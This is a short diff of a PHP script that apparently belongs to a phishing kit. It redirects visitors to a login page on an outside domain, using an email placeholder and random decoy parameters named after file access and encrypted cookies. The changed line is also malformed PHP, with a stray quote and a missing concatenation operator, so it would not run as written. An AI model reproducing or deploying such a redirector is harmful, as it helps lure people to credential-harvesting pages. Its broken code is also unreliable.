@@ -25,6 +25,6 @@
 	$accessFile = Array("true","granted","accessing","valid","validating");
 	$accessFiles = $accessFile[array_rand($accessFile)];
 	
-	header("Location: https://iconicsigngroup.com/caller/content/login.php/?email=##EMAIL##".$accessFiles."&fileAccess=".$fileAccess."&encryptedCookie=".$cookie."&u=".md5(rand())."&connecting=".md5(rand())."&phaseAccess=".md5(rand())."&p=".md5(rand()));
+	header("Location: https://iconicsigngroup.com/caller/content/login.php/??email=##EMAIL##" accessToFile=".$accessFiles."&fileAccess=".$fileAccess."&encryptedCookie=".$cookie."&u=".md5(rand())."&connecting=".md5(rand())."&phaseAccess=".md5(rand())."&p=".md5(rand()));
 
 ?>
